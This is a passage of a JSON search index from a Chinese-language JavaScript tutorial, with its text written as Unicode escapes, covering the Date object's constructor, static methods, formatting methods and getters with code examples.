06 2013 06:00:00 GMT+0800 (CST) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u672c\u5730\u65f6\u533a\uff08\u4e1c\u516b\u65f6\u533a\uff09\u76841\u67086\u65e50\u70b90\u5206\uff0c\u662f UTC \u65f6\u533a\u7684\u524d\u4e00\u5929\u4e0b\u534816\u70b9\u3002\u8bbe\u4e3a UTC \u65f6\u533a\u768422\u70b9\u4ee5\u540e\uff0c\u5c31\u53d8\u4e3a\u672c\u5730\u65f6\u533a\u7684\u4e0a\u53486\u70b9\u3002 \u53c2\u8003\u94fe\u63a5 \u00b6 Rakhitha Nimesh\uff0c Getting Started with the Date Object Ilya Kantor, Date/Time functions","title":"Date \u5bf9\u8c61"},{"location":"stdlib/date/#date","text":"Date \u5bf9\u8c61\u662f JavaScript \u539f\u751f\u7684\u65f6\u95f4\u5e93\u3002\u5b83\u4ee5\u56fd\u9645\u6807\u51c6\u65f6\u95f4\uff08UTC\uff091970\u5e741\u67081\u65e500:00:00\u4f5c\u4e3a\u65f6\u95f4\u7684\u96f6\u70b9\uff0c\u53ef\u4ee5\u8868\u793a\u7684\u65f6\u95f4\u8303\u56f4\u662f\u524d\u540e\u54041\u4ebf\u5929\uff08\u5355\u4f4d\u4e3a\u6beb\u79d2\uff09\u3002","title":"Date \u5bf9\u8c61"},{"location":"stdlib/date/#_1","text":"Date \u5bf9\u8c61\u53ef\u4ee5\u4f5c\u4e3a\u666e\u901a\u51fd\u6570\u76f4\u63a5\u8c03\u7528\uff0c\u8fd4\u56de\u4e00\u4e2a\u4ee3\u8868\u5f53\u524d\u65f6\u95f4\u7684\u5b57\u7b26\u4e32\u3002 1 2 Date () // \"Tue Dec 01 2015 09:34:43 GMT+0800 (CST)\" \u6ce8\u610f\uff0c\u5373\u4f7f\u5e26\u6709\u53c2\u6570\uff0c Date \u4f5c\u4e3a\u666e\u901a\u51fd\u6570\u4f7f\u7528\u65f6\uff0c\u8fd4\u56de\u7684\u8fd8\u662f\u5f53\u524d\u65f6\u95f4\u3002 1 2 Date ( 2000 , 1 , 1 ) // \"Tue Dec 01 2015 09:34:43 GMT+0800 (CST)\" \u4e0a\u9762\u4ee3\u7801\u8bf4\u660e\uff0c\u65e0\u8bba\u6709\u6ca1\u6709\u53c2\u6570\uff0c\u76f4\u63a5\u8c03\u7528 Date \u603b\u662f\u8fd4\u56de\u5f53\u524d\u65f6\u95f4\u3002","title":"\u666e\u901a\u51fd\u6570\u7684\u7528\u6cd5"},{"location":"stdlib/date/#_2","text":"Date \u8fd8\u53ef\u4ee5\u5f53\u4f5c\u6784\u9020\u51fd\u6570\u4f7f\u7528\u3002\u5bf9\u5b83\u4f7f\u7528 new \u547d\u4ee4\uff0c\u4f1a\u8fd4\u56de\u4e00\u4e2a Date \u5bf9\u8c61\u7684\u5b9e\u4f8b\u3002\u5982\u679c\u4e0d\u52a0\u53c2\u6570\uff0c\u5b9e\u4f8b\u4ee3\u8868\u7684\u5c31\u662f\u5f53\u524d\u65f6\u95f4\u3002 1 var today = new Date (); Date \u5b9e\u4f8b\u6709\u4e00\u4e2a\u72ec\u7279\u7684\u5730\u65b9\u3002\u5176\u4ed6\u5bf9\u8c61\u6c42\u503c\u7684\u65f6\u5019\uff0c\u90fd\u662f\u9ed8\u8ba4\u8c03\u7528 .valueOf() \u65b9\u6cd5\uff0c\u4f46\u662f Date \u5b9e\u4f8b\u6c42\u503c\u7684\u65f6\u5019\uff0c\u9ed8\u8ba4\u8c03\u7528\u7684\u662f toString() \u65b9\u6cd5\u3002\u8fd9\u5bfc\u81f4\u5bf9 Date \u5b9e\u4f8b\u6c42\u503c\uff0c\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u4ee3\u8868\u8be5\u5b9e\u4f8b\u5bf9\u5e94\u7684\u65f6\u95f4\u3002 1 2 3 4 5 6 7 8 var today = new Date (); today // \"Tue Dec 01 2015 09:34:43 GMT+0800 (CST)\" // \u7b49\u540c\u4e8e today . toString () // \"Tue Dec 01 2015 09:34:43 GMT+0800 (CST)\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c today \u662f Date \u7684\u5b9e\u4f8b\uff0c\u76f4\u63a5\u6c42\u503c\u7b49\u540c\u4e8e\u8c03\u7528 toString \u65b9\u6cd5\u3002 \u4f5c\u4e3a\u6784\u9020\u51fd\u6570\u65f6\uff0c Date \u5bf9\u8c61\u53ef\u4ee5\u63a5\u53d7\u591a\u79cd\u683c\u5f0f\u7684\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u8be5\u53c2\u6570\u5bf9\u5e94\u7684\u65f6\u95f4\u5b9e\u4f8b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 // \u53c2\u6570\u4e3a\u65f6\u95f4\u96f6\u70b9\u5f00\u59cb\u8ba1\u7b97\u7684\u6beb\u79d2\u6570 new Date ( 1378218728000 ) // Tue Sep 03 2013 22:32:08 GMT+0800 (CST) // \u53c2\u6570\u4e3a\u65e5\u671f\u5b57\u7b26\u4e32 new Date ( 'January 6, 2013' ); // Sun Jan 06 2013 00:00:00 GMT+0800 (CST) // \u53c2\u6570\u4e3a\u591a\u4e2a\u6574\u6570\uff0c // \u4ee3\u8868\u5e74\u3001\u6708\u3001\u65e5\u3001\u5c0f\u65f6\u3001\u5206\u949f\u3001\u79d2\u3001\u6beb\u79d2 new Date ( 2013 , 0 , 1 , 0 , 0 , 0 , 0 ) // Tue Jan 01 2013 00:00:00 GMT+0800 (CST) \u5173\u4e8e Date \u6784\u9020\u51fd\u6570\u7684\u53c2\u6570\uff0c\u6709\u51e0\u70b9\u8bf4\u660e\u3002 \u7b2c\u4e00\u70b9\uff0c\u53c2\u6570\u53ef\u4ee5\u662f\u8d1f\u6574\u6570\uff0c\u4ee3\u88681970\u5e74\u5143\u65e6\u4e4b\u524d\u7684\u65f6\u95f4\u3002 1 2 new Date ( - 1378218728000 ) // Fri Apr 30 1926 17:27:52 GMT+0800 (CST) \u7b2c\u4e8c\u70b9\uff0c\u53ea\u8981\u662f\u80fd\u88ab Date.parse() \u65b9\u6cd5\u89e3\u6790\u7684\u5b57\u7b26\u4e32\uff0c\u90fd\u53ef\u4ee5\u5f53\u4f5c\u53c2\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 new Date ( '2013-2-15' ) new Date ( '2013/2/15' ) new Date ( '02/15/2013' ) new Date ( '2013-FEB-15' ) new Date ( 'FEB, 15, 2013' ) new Date ( 'FEB 15, 2013' ) new Date ( 'February, 15, 2013' ) new Date ( 'February 15, 2013' ) new Date ( '15 Feb 2013' ) new Date ( '15, February, 2013' ) // Fri Feb 15 2013 00:00:00 GMT+0800 (CST) \u4e0a\u9762\u591a\u79cd\u65e5\u671f\u5b57\u7b26\u4e32\u7684\u5199\u6cd5\uff0c\u8fd4\u56de\u7684\u90fd\u662f\u540c\u4e00\u4e2a\u65f6\u95f4\u3002 \u7b2c\u4e09\uff0c\u53c2\u6570\u4e3a\u5e74\u3001\u6708\u3001\u65e5\u7b49\u591a\u4e2a\u6574\u6570\u65f6\uff0c\u5e74\u548c\u6708\u662f\u4e0d\u80fd\u7701\u7565\u7684\uff0c\u5176\u4ed6\u53c2\u6570\u90fd\u53ef\u4ee5\u7701\u7565\u7684\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8fd9\u65f6\u81f3\u5c11\u9700\u8981\u4e24\u4e2a\u53c2\u6570\uff0c\u56e0\u4e3a\u5982\u679c\u53ea\u4f7f\u7528\u201c\u5e74\u201d\u8fd9\u4e00\u4e2a\u53c2\u6570\uff0c Date \u4f1a\u5c06\u5176\u89e3\u91ca\u4e3a\u6beb\u79d2\u6570\u3002 1 2 new Date ( 2013 ) // Thu Jan 01 1970 08:00:02 GMT+0800 (CST) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c2013\u88ab\u89e3\u91ca\u4e3a\u6beb\u79d2\u6570\uff0c\u800c\u4e0d\u662f\u5e74\u4efd\u3002 1 2 3 4 5 6 7 8 new Date ( 2013 , 0 ) // Tue Jan 01 2013 00:00:00 GMT+0800 (CST) new Date ( 2013 , 0 , 1 ) // Tue Jan 01 2013 00:00:00 GMT+0800 (CST) new Date ( 2013 , 0 , 1 , 0 ) // Tue Jan 01 2013 00:00:00 GMT+0800 (CST) new Date ( 2013 , 0 , 1 , 0 , 0 , 0 , 0 ) // Tue Jan 01 2013 00:00:00 GMT+0800 (CST) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e0d\u7ba1\u6709\u51e0\u4e2a\u53c2\u6570\uff0c\u8fd4\u56de\u7684\u90fd\u662f2013\u5e741\u67081\u65e5\u96f6\u70b9\u3002 \u6700\u540e\uff0c\u5404\u4e2a\u53c2\u6570\u7684\u53d6\u503c\u8303\u56f4\u5982\u4e0b\u3002 \u5e74\uff1a\u4f7f\u7528\u56db\u4f4d\u6570\u5e74\u4efd\uff0c\u6bd4\u5982 2000 \u3002\u5982\u679c\u5199\u6210\u4e24\u4f4d\u6570\u6216\u4e2a\u4f4d\u6570\uff0c\u5219\u52a0\u4e0a 1900 \uff0c\u5373 10 \u4ee3\u88681910\u5e74\u3002\u5982\u679c\u662f\u8d1f\u6570\uff0c\u8868\u793a\u516c\u5143\u524d\u3002 \u6708\uff1a 0 \u8868\u793a\u4e00\u6708\uff0c\u4f9d\u6b21\u7c7b\u63a8\uff0c 11 \u8868\u793a12\u6708\u3002 \u65e5\uff1a 1 \u5230 31 \u3002 \u5c0f\u65f6\uff1a 0 \u5230 23 \u3002 \u5206\u949f\uff1a 0 \u5230 59 \u3002 \u79d2\uff1a 0 \u5230 59 \u6beb\u79d2\uff1a 0 \u5230 999 \u3002 \u6ce8\u610f\uff0c\u6708\u4efd\u4ece 0 \u5f00\u59cb\u8ba1\u7b97\uff0c\u4f46\u662f\uff0c\u5929\u6570\u4ece 1 \u5f00\u59cb\u8ba1\u7b97\u3002\u53e6\u5916\uff0c\u9664\u4e86\u65e5\u671f\u7684\u9ed8\u8ba4\u503c\u4e3a 1 \uff0c\u5c0f\u65f6\u3001\u5206\u949f\u3001\u79d2\u949f\u548c\u6beb\u79d2\u7684\u9ed8\u8ba4\u503c\u90fd\u662f 0 \u3002 \u8fd9\u4e9b\u53c2\u6570\u5982\u679c\u8d85\u51fa\u4e86\u6b63\u5e38\u8303\u56f4\uff0c\u4f1a\u88ab\u81ea\u52a8\u6298\u7b97\u3002\u6bd4\u5982\uff0c\u5982\u679c\u6708\u8bbe\u4e3a 15 \uff0c\u5c31\u6298\u7b97\u4e3a\u4e0b\u4e00\u5e74\u76844\u6708\u3002 1 2 3 4 new Date ( 2013 , 15 ) // Tue Apr 01 2014 00:00:00 GMT+0800 (CST) new Date ( 2013 , 0 , 0 ) // Mon Dec 31 2012 00:00:00 GMT+0800 (CST) \u4e0a\u9762\u4ee3\u7801\u7684\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\uff0c\u65e5\u671f\u8bbe\u4e3a 0 \uff0c\u5c31\u4ee3\u8868\u4e0a\u4e2a\u6708\u7684\u6700\u540e\u4e00\u5929\u3002 \u53c2\u6570\u8fd8\u53ef\u4ee5\u4f7f\u7528\u8d1f\u6570\uff0c\u8868\u793a\u6263\u53bb\u7684\u65f6\u95f4\u3002 1 2 3 4 new Date ( 2013 , - 1 ) // Sat Dec 01 2012 00:00:00 GMT+0800 (CST) new Date ( 2013 , 0 , - 1 ) // Sun Dec 30 2012 00:00:00 GMT+0800 (CST) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5206\u522b\u5bf9\u6708\u548c\u65e5\u4f7f\u7528\u4e86\u8d1f\u6570\uff0c\u8868\u793a\u4ece\u57fa\u51c6\u65e5\u6263\u53bb\u76f8\u5e94\u7684\u65f6\u95f4\u3002","title":"\u6784\u9020\u51fd\u6570\u7684\u7528\u6cd5"},{"location":"stdlib/date/#_3","text":"\u7c7b\u578b\u81ea\u52a8\u8f6c\u6362\u65f6\uff0c Date \u5b9e\u4f8b\u5982\u679c\u8f6c\u4e3a\u6570\u503c\uff0c\u5219\u7b49\u4e8e\u5bf9\u5e94\u7684\u6beb\u79d2\u6570\uff1b\u5982\u679c\u8f6c\u4e3a\u5b57\u7b26\u4e32\uff0c\u5219\u7b49\u4e8e\u5bf9\u5e94\u7684\u65e5\u671f\u5b57\u7b26\u4e32\u3002\u6240\u4ee5\uff0c\u4e24\u4e2a\u65e5\u671f\u5b9e\u4f8b\u5bf9\u8c61\u8fdb\u884c\u51cf\u6cd5\u8fd0\u7b97\u65f6\uff0c\u8fd4\u56de\u7684\u662f\u5b83\u4eec\u95f4\u9694\u7684\u6beb\u79d2\u6570\uff1b\u8fdb\u884c\u52a0\u6cd5\u8fd0\u7b97\u65f6\uff0c\u8fd4\u56de\u7684\u662f\u4e24\u4e2a\u5b57\u7b26\u4e32\u8fde\u63a5\u800c\u6210\u7684\u65b0\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 var d1 = new Date ( 2000 , 2 , 1 ); var d2 = new Date ( 2000 , 3 , 1 ); d2 - d1 // 2678400000 d2 + d1 // \"Sat Apr 01 2000 00:00:00 GMT+0800 (CST)Wed Mar 01 2000 00:00:00 GMT+0800 (CST)\"","title":"\u65e5\u671f\u7684\u8fd0\u7b97"},{"location":"stdlib/date/#_4","text":"","title":"\u9759\u6001\u65b9\u6cd5"},{"location":"stdlib/date/#datenow","text":"Date.now \u65b9\u6cd5\u8fd4\u56de\u5f53\u524d\u65f6\u95f4\u8ddd\u79bb\u65f6\u95f4\u96f6\u70b9\uff081970\u5e741\u67081\u65e5 00:00:00 UTC\uff09\u7684\u6beb\u79d2\u6570\uff0c\u76f8\u5f53\u4e8e Unix \u65f6\u95f4\u6233\u4e58\u4ee51000\u3002 1 Date . now () // 1364026285194","title":"Date.now()"},{"location":"stdlib/date/#dateparse","text":"Date.parse \u65b9\u6cd5\u7528\u6765\u89e3\u6790\u65e5\u671f\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u8be5\u65f6\u95f4\u8ddd\u79bb\u65f6\u95f4\u96f6\u70b9\uff081970\u5e741\u67081\u65e5 00:00:00\uff09\u7684\u6beb\u79d2\u6570\u3002 \u65e5\u671f\u5b57\u7b26\u4e32\u5e94\u8be5\u7b26\u5408 RFC 2822 \u548c ISO 8061 \u8fd9\u4e24\u4e2a\u6807\u51c6\uff0c\u5373 YYYY-MM-DDTHH:mm:ss.sssZ \u683c\u5f0f\uff0c\u5176\u4e2d\u6700\u540e\u7684 Z \u8868\u793a\u65f6\u533a\u3002\u4f46\u662f\uff0c\u5176\u4ed6\u683c\u5f0f\u4e5f\u53ef\u4ee5\u88ab\u89e3\u6790\uff0c\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 Date . parse ( 'Aug 9, 1995' ) Date . parse ( 'January 26, 2011 13:51:50' ) Date . parse ( 'Mon, 25 Dec 1995 13:30:00 GMT' ) Date . parse ( 'Mon, 25 Dec 1995 13:30:00 +0430' ) Date . parse ( '2011-10-10' ) Date . parse ( '2011-10-10T14:48:00' ) \u4e0a\u9762\u7684\u65e5\u671f\u5b57\u7b26\u4e32\u90fd\u53ef\u4ee5\u89e3\u6790\u3002 \u5982\u679c\u89e3\u6790\u5931\u8d25\uff0c\u8fd4\u56de NaN \u3002 1 Date . parse ( 'xxx' ) // NaN","title":"Date.parse()"},{"location":"stdlib/date/#dateutc","text":"Date.UTC \u65b9\u6cd5\u63a5\u53d7\u5e74\u3001\u6708\u3001\u65e5\u7b49\u53d8\u91cf\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u8be5\u65f6\u95f4\u8ddd\u79bb\u65f6\u95f4\u96f6\u70b9\uff081970\u5e741\u67081\u65e5 00:00:00 UTC\uff09\u7684\u6beb\u79d2\u6570\u3002 1 2 3 4 5 6 // \u683c\u5f0f Date . UTC ( year , month [, date [, hrs [, min [, sec [, ms ]]]]]) // \u7528\u6cd5 Date . UTC ( 2011 , 0 , 1 , 2 , 3 , 4 , 567 ) // 1293847384567 \u8be5\u65b9\u6cd5\u7684\u53c2\u6570\u7528\u6cd5\u4e0e Date \u6784\u9020\u51fd\u6570\u5b8c\u5168\u4e00\u81f4\uff0c\u6bd4\u5982\u6708\u4ece 0 \u5f00\u59cb\u8ba1\u7b97\uff0c\u65e5\u671f\u4ece 1 \u5f00\u59cb\u8ba1\u7b97\u3002\u533a\u522b\u5728\u4e8e Date.UTC \u65b9\u6cd5\u7684\u53c2\u6570\uff0c\u4f1a\u88ab\u89e3\u91ca\u4e3a UTC \u65f6\u95f4\uff08\u4e16\u754c\u6807\u51c6\u65f6\u95f4\uff09\uff0c Date \u6784\u9020\u51fd\u6570\u7684\u53c2\u6570\u4f1a\u88ab\u89e3\u91ca\u4e3a\u5f53\u524d\u65f6\u533a\u7684\u65f6\u95f4\u3002","title":"Date.UTC()"},{"location":"stdlib/date/#_5","text":"Date \u7684\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u6709\u51e0\u5341\u4e2a\u81ea\u5df1\u7684\u65b9\u6cd5\uff0c\u9664\u4e86 valueOf \u548c toString \uff0c\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u4e09\u7c7b\u3002 to \u7c7b\uff1a\u4ece Date \u5bf9\u8c61\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6307\u5b9a\u7684\u65f6\u95f4\u3002 get \u7c7b\uff1a\u83b7\u53d6 Date \u5bf9\u8c61\u7684\u65e5\u671f\u548c\u65f6\u95f4\u3002 set \u7c7b\uff1a\u8bbe\u7f6e Date \u5bf9\u8c61\u7684\u65e5\u671f\u548c\u65f6\u95f4\u3002","title":"\u5b9e\u4f8b\u65b9\u6cd5"},{"location":"stdlib/date/#dateprototypevalueof","text":"valueOf \u65b9\u6cd5\u8fd4\u56de\u5b9e\u4f8b\u5bf9\u8c61\u8ddd\u79bb\u65f6\u95f4\u96f6\u70b9\uff081970\u5e741\u67081\u65e500:00:00 UTC\uff09\u5bf9\u5e94\u7684\u6beb\u79d2\u6570\uff0c\u8be5\u65b9\u6cd5\u7b49\u540c\u4e8e getTime \u65b9\u6cd5\u3002 1 2 3 4 var d = new Date (); d . valueOf () // 1362790014817 d . getTime () // 1362790014817 \u9884\u671f\u4e3a\u6570\u503c\u7684\u573a\u5408\uff0c Date \u5b9e\u4f8b\u4f1a\u81ea\u52a8\u8c03\u7528\u8be5\u65b9\u6cd5\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u65b9\u6cd5\u8ba1\u7b97\u65f6\u95f4\u7684\u95f4\u9694\u3002 1 2 3 4 var start = new Date (); // ... var end = new Date (); var elapsed = end - start ;","title":"Date.prototype.valueOf()"},{"location":"stdlib/date/#to","text":"\uff081\uff09Date.prototype.toString() toString \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5b8c\u6574\u7684\u65e5\u671f\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 var d = new Date ( 2013 , 0 , 1 ); d . toString () // \"Tue Jan 01 2013 00:00:00 GMT+0800 (CST)\" d // \"Tue Jan 01 2013 00:00:00 GMT+0800 (CST)\" \u56e0\u4e3a toString \u662f\u9ed8\u8ba4\u7684\u8c03\u7528\u65b9\u6cd5\uff0c\u6240\u4ee5\u5982\u679c\u76f4\u63a5\u8bfb\u53d6 Date \u5b9e\u4f8b\uff0c\u5c31\u76f8\u5f53\u4e8e\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\u3002 \uff082\uff09Date.prototype.toUTCString() toUTCString \u65b9\u6cd5\u8fd4\u56de\u5bf9\u5e94\u7684 UTC \u65f6\u95f4\uff0c\u4e5f\u5c31\u662f\u6bd4\u5317\u4eac\u65f6\u95f4\u665a8\u4e2a\u5c0f\u65f6\u3002 1 2 3 4 var d = new Date ( 2013 , 0 , 1 ); d . toUTCString () // \"Mon, 31 Dec 2012 16:00:00 GMT\" \uff083\uff09Date.prototype.toISOString() toISOString \u65b9\u6cd5\u8fd4\u56de\u5bf9\u5e94\u65f6\u95f4\u7684 ISO8601 \u5199\u6cd5\u3002 1 2 3 4 var d = new Date ( 2013 , 0 , 1 ); d . toISOString () // \"2012-12-31T16:00:00.000Z\" \u6ce8\u610f\uff0c toISOString \u65b9\u6cd5\u8fd4\u56de\u7684\u603b\u662f UTC \u65f6\u533a\u7684\u65f6\u95f4\u3002 \uff084\uff09Date.prototype.toJSON() toJSON \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u7b26\u5408 JSON \u683c\u5f0f\u7684 ISO \u65e5\u671f\u5b57\u7b26\u4e32\uff0c\u4e0e toISOString \u65b9\u6cd5\u7684\u8fd4\u56de\u7ed3\u679c\u5b8c\u5168\u76f8\u540c\u3002 1 2 3 4 var d = new Date ( 2013 , 0 , 1 ); d . toJSON () // \"2012-12-31T16:00:00.000Z\" \uff085\uff09Date.prototype.toDateString() toDateString \u65b9\u6cd5\u8fd4\u56de\u65e5\u671f\u5b57\u7b26\u4e32\uff08\u4e0d\u542b\u5c0f\u65f6\u3001\u5206\u548c\u79d2\uff09\u3002 1 2 var d = new Date ( 2013 , 0 , 1 ); d . toDateString () // \"Tue Jan 01 2013\" \uff086\uff09Date.prototype.toTimeString() toTimeString \u65b9\u6cd5\u8fd4\u56de\u65f6\u95f4\u5b57\u7b26\u4e32\uff08\u4e0d\u542b\u5e74\u6708\u65e5\uff09\u3002 1 2 var d = new Date ( 2013 , 0 , 1 ); d . toTimeString () // \"00:00:00 GMT+0800 (CST)\" \uff087\uff09\u672c\u5730\u65f6\u95f4 \u4ee5\u4e0b\u4e09\u79cd\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5c06 Date \u5b9e\u4f8b\u8f6c\u4e3a\u8868\u793a\u672c\u5730\u65f6\u95f4\u7684\u5b57\u7b26\u4e32\u3002 Date.prototype.toLocaleString() \uff1a\u5b8c\u6574\u7684\u672c\u5730\u65f6\u95f4\u3002 Date.prototype.toLocaleDateString() \uff1a\u672c\u5730\u65e5\u671f\uff08\u4e0d\u542b\u5c0f\u65f6\u3001\u5206\u548c\u79d2\uff09\u3002 Date.prototype.toLocaleTimeString() \uff1a\u672c\u5730\u65f6\u95f4\uff08\u4e0d\u542b\u5e74\u6708\u65e5\uff09\u3002 \u4e0b\u9762\u662f\u7528\u6cd5\u5b9e\u4f8b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var d = new Date ( 2013 , 0 , 1 ); d . toLocaleString () // \u4e2d\u6587\u7248\u6d4f\u89c8\u5668\u4e3a\"2013\u5e741\u67081\u65e5 \u4e0a\u534812:00:00\" // \u82f1\u6587\u7248\u6d4f\u89c8\u5668\u4e3a\"1/1/2013 12:00:00 AM\" d . toLocaleDateString () // \u4e2d\u6587\u7248\u6d4f\u89c8\u5668\u4e3a\"2013\u5e741\u67081\u65e5\" // \u82f1\u6587\u7248\u6d4f\u89c8\u5668\u4e3a\"1/1/2013\" d . toLocaleTimeString () // \u4e2d\u6587\u7248\u6d4f\u89c8\u5668\u4e3a\"\u4e0a\u534812:00:00\" // \u82f1\u6587\u7248\u6d4f\u89c8\u5668\u4e3a\"12:00:00 AM\" \u8fd9\u4e09\u4e2a\u65b9\u6cd5\u90fd\u6709\u4e24\u4e2a\u53ef\u9009\u7684\u53c2\u6570\u3002 1 2 3 dateObj . toLocaleString ([ locales [, options ]]) dateObj . toLocaleDateString ([ locales [, options ]]) dateObj . toLocaleTimeString ([ locales [, options ]]) \u8fd9\u4e24\u4e2a\u53c2\u6570\u4e2d\uff0c locales \u662f\u4e00\u4e2a\u6307\u5b9a\u6240\u7528\u8bed\u8a00\u7684\u5b57\u7b26\u4e32\uff0c options \u662f\u4e00\u4e2a\u914d\u7f6e\u5bf9\u8c61\u3002\u4e0b\u9762\u662f locales \u7684\u4f8b\u5b50\uff0c\u5206\u522b\u91c7\u7528 en-US \u548c zh-CN \u8bed\u8a00\u8bbe\u5b9a\u3002 1 2 3 4 5 6 7 8 9 10 var d = new Date ( 2013 , 0 , 1 ); d . toLocaleString ( 'en-US' ) // \"1/1/2013, 12:00:00 AM\" d . toLocaleString ( 'zh-CN' ) // \"2013/1/1 \u4e0a\u534812:00:00\" d . toLocaleDateString ( 'en-US' ) // \"1/1/2013\" d . toLocaleDateString ( 'zh-CN' ) // \"2013/1/1\" d . toLocaleTimeString ( 'en-US' ) // \"12:00:00 AM\" d . toLocaleTimeString ( 'zh-CN' ) // \"\u4e0a\u534812:00:00\" options \u914d\u7f6e\u5bf9\u8c61\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002 dateStyle \uff1a\u53ef\u80fd\u7684\u503c\u4e3a full \u3001 long \u3001 medium \u3001 short \u3002 timeStyle \uff1a\u53ef\u80fd\u7684\u503c\u4e3a full \u3001 long \u3001 medium \u3001 short \u3002 month \uff1a\u53ef\u80fd\u7684\u503c\u4e3a numeric \u3001 2-digit \u3001 long \u3001 short \u3001 narrow \u3002 year \uff1a\u53ef\u80fd\u7684\u503c\u4e3a numeric \u3001 2-digit \u3002 weekday \uff1a\u53ef\u80fd\u7684\u503c\u4e3a long \u3001 short \u3001 narrow \u3002 day \u3001 hour \u3001 minute \u3001 second \uff1a\u53ef\u80fd\u7684\u503c\u4e3a numeric \u3001 2-digit \u3002 timeZone \uff1a\u53ef\u80fd\u7684\u503c\u4e3a IANA \u7684\u65f6\u533a\u6570\u636e\u5e93\u3002 timeZooneName \uff1a\u53ef\u80fd\u7684\u503c\u4e3a long \u3001 short \u3002 hour12 \uff1a24\u5c0f\u65f6\u5468\u671f\u8fd8\u662f12\u5c0f\u65f6\u5468\u671f\uff0c\u53ef\u80fd\u7684\u503c\u4e3a true \u3001 false \u3002 \u4e0b\u9762\u662f\u7528\u6cd5\u5b9e\u4f8b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 var d = new Date ( 2013 , 0 , 1 ); d . toLocaleDateString ( 'en-US' , { weekday : 'long' , year : 'numeric' , month : 'long' , day : 'numeric' }) // \"Tuesday, January 1, 2013\" d . toLocaleDateString ( 'en-US' , { day : \"2-digit\" , month : \"long\" , year : \"2-digit\" }); // \"January 01, 13\" d . toLocaleTimeString ( 'en-US' , { timeZone : 'UTC' , timeZoneName : 'short' }) // \"4:00:00 PM UTC\" d . toLocaleTimeString ( 'en-US' , { timeZone : 'Asia/Shanghai' , timeZoneName : 'long' }) // \"12:00:00 AM China Standard Time\" d . toLocaleTimeString ( 'en-US' , { hour12 : false }) // \"00:00:00\" d . toLocaleTimeString ( 'en-US' , { hour12 : true }) // \"12:00:00 AM\"","title":"to \u7c7b\u65b9\u6cd5"},{"location":"stdlib/date/#get","text":"Date \u5bf9\u8c61\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217 get* \u65b9\u6cd5\uff0c\u7528\u6765\u83b7\u53d6\u5b9e\u4f8b\u5bf9\u8c61\u67d0\u4e2a\u65b9\u9762\u7684\u503c\u3002 getTime() \uff1a\u8fd4\u56de\u5b9e\u4f8b\u8ddd\u79bb1970\u5e741\u67081\u65e500:00:00\u7684\u6beb\u79d2\u6570\uff0c\u7b49\u540c\u4e8e valueOf \u65b9\u6cd5\u3002 getDate() \uff1a\u8fd4\u56de\u5b9e\u4f8b\u5bf9\u8c61\u5bf9\u5e94\u6bcf\u4e2a\u6708\u7684\u51e0\u53f7\uff08\u4ece1\u5f00\u59cb\uff09\u3002 getDay() \uff1a\u8fd4\u56de\u661f\u671f\u51e0\uff0c\u661f\u671f\u65e5\u4e3a0\uff0c\u661f\u671f\u4e00\u4e3a1\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002 getFullYear() \uff1a\u8fd4\u56de\u56db\u4f4d\u7684\u5e74\u4efd\u3002 getMonth() \uff1a\u8fd4\u56de\u6708\u4efd\uff080\u8868\u793a1\u6708\uff0c11\u8868\u793a12\u6708\uff09\u3002 getHours() \uff1a\u8fd4\u56de\u5c0f\u65f6\uff080-23\uff09\u3002 getMilliseconds() \uff1a\u8fd4\u56de\u6beb\u79d2\uff080-999\uff09\u3002 getMinutes() \uff1a\u8fd4\u56de\u5206\u949f\uff080-59\uff09\u3002 getSeconds() \uff1a\u8fd4\u56de\u79d2\uff080-59\uff09\u3002 getTimezoneOffset() \uff1a\u8fd4\u56de\u5f53\u524d\u65f6\u95f4\u4e0e UTC \u7684\u65f6\u533a\u5dee\u5f02\uff0c\u4ee5\u5206\u949f\u8868\u793a\uff0c\u8fd4\u56de\u7ed3\u679c\u8003\u8651\u5230\u4e86\u590f\u4ee4\u65f6\u56e0\u7d20\u3002 \u6240\u6709\u8fd9\u4e9b get* \u65b9\u6cd5\u8fd4\u56de\u7684\u90fd\u662f\u6574\u6570\uff0c\u4e0d\u540c\u65b9\u6cd5\u8fd4\u56de\u503c\u7684\u8303\u56f4\u4e0d\u4e00\u6837\u3002 \u5206\u949f\u548c\u79d2\uff1a0 \u5230 59 \u5c0f\u65f6\uff1a0 \u5230 23 \u661f\u671f\uff1a0\uff08\u661f\u671f\u5929\uff09\u5230 6\uff08\u661f\u671f\u516d\uff09 \u65e5\u671f\uff1a1 \u5230 31 \u6708\u4efd\uff1a0\uff08\u4e00\u6708\uff09\u5230 11\uff08\u5341\u4e8c\u6708\uff09 1 2 3 4 5 6 var d = new Date ( 'January 6, 2013' ); d . getDate () // 6 d . getMonth () // 0 d . getFullYear () // 2013 d . getTimezoneOffset () // -480 